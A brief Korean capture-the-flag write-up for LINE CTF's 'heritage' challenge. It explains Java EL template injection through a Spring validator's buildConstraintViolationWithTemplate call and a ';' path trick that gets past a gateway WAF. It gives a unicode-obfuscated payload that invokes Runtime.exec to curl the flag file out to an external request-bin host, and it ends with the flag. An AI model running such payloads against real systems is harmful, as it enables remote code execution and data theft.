## heritage

```java
@RequestMapping({"/api/internal"})
public class InternalController extends BaseController {
  private static final Logger log = LoggerFactory.getLogger(me.line.ctf.controller.InternalController.class);
  
  @PostMapping({"/"})
  public String index(@ValidateName @RequestBody RequestDto name) {
    log.info("{} is here !", name);
    return "Welcome " + name.getName() + "!";
  }
}
```
```java
public boolean isValid(String value, ConstraintValidatorContext context) {
    if (StringUtils.isEmpty(value) || PATTERN.matcher(value).matches())
      return true; 
    context.buildConstraintViolationWithTemplate(
        String.format("%s", new Object[] { value })).addConstraintViolation();
    return false;
  }
```
`/api/internal` 경로로 접근하였을 때 실행되는 internalController에서 
Name 파라미터에 대한 validator가 동작할 때 context.buildConstraintViolationWithTemplate을 사용하여 
EL Template injection이 발생합니다. 

해당 경로에 접근하기 위해선 gw에 존재하는 WAF를 우회해야하는데 이는 `;`를 이용하여 우회하는 것이 가능합니다.
```
http://35.200.117.55:20080/api/external/..;/internal;/
```

Template engine엔 sandbox가 존재하지 않아서 java.lang.Runtime 클래스를 이용하여 commnd 실행이 가능합니다.
```json
{"name":"${''.getClass().forName('java.lang.Runtim\u0065').getM\u0065thods()[6].invok\u0065(''.getClass().forName('java.lang.Runtim\u0065')).\u0065xec('curl https://enllwt2ugqrt.x.pipedream.net/ -F=@/FLAG')}"}
```

```
LINECTF{7988de328384f8a19998923a87aa053f}
```